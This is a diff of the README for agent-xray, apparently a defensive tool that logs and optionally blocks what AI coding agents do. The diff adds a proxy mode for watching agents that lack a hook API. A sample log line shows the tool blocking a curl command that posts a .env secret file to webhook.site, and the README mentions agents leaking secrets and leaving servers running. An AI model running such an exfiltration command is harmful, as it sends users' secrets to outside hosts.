@@ -8,7 +8,7 @@
 ![deps](https://img.shields.io/badge/runtime%20deps-0-7aa2f7)
 [![license](https://img.shields.io/badge/license-MIT-8b98a9)](LICENSE)
 
-![agent-xray live demo](docs/demo.svg)
+![agent-xray live demo](docs/demo.gif)
 
 **Why this exists.** GitGuardian found **24,008 secrets** leaked in agent configs on public GitHub — 2,117 still working. On one real MacBook, agents had left three servers running for **26–51 days**, listening on all network interfaces. Nobody noticed. agent-xray is the guard: it watches what agents actually do — files, commands, network — logs everything, and (opt-in) blocks the dangerous parts.
 
@@ -19,7 +19,18 @@
 18:26:23  ✖ BLOCK  exec       curl -X POST -d @.env https://webhook.site/…  ← uploads a secret file
 ```
 
-> Status: **v0.6** — multi-agent (Claude Code, ZCode, Cursor), observe/guard modes, tamper seal, **sweep** (AI-agent leftovers), **audit** (one-command AI-safety score + HTML report), live 3D dashboard. Zero runtime dependencies. Node 18+.
+> Status: **v0.7** — multi-agent (Claude Code, ZCode, Cursor), **proxy mode** (domain-level visibility for ANY agent), observe/guard modes, tamper seal, sweep, audit, live 3D dashboard. Zero runtime dependencies. Node 18+.
+
+## Proxy: watch agents that have no hook API
+
+Codex CLI, Gemini CLI, Aider — anything that speaks HTTP can be watched through the local proxy:
+
+```bash
+agent-xray proxy                 # listens on 127.0.0.1:8080
+HTTPS_PROXY=http://127.0.0.1:8080 HTTP_PROXY=http://127.0.0.1:8080 codex
+```
+
+Every domain the agent touches is logged (session `proxy`) and shown on the dashboard. HTTPS is **tunneled, not decrypted** — hostnames only, never contents. In guard mode, warn-level and blocked hosts are refused with 403 at connect time.
 
 ## Audit: your computer's AI Safety Score in one command
 
